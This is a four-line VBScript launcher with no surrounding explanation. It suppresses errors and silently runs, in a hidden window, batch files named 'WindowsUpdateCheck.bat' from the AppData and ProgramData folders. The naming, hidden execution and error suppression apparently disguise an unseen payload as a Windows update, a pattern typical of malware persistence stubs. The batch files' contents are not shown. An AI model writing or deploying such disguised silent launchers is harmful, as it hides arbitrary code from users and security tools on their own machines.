On Error Resume Next
Set WshShell = WScript.CreateObject( "WScript.Shell" )
WshShell.Run "%APPDATA%\WindowsUpdateCheck\WindowsUpdateCheck.bat",0,True
WshShell.Run "%PROGRAMDATA%\WindowsUpdateCheck\WindowsUpdateCheck.bat",0,True
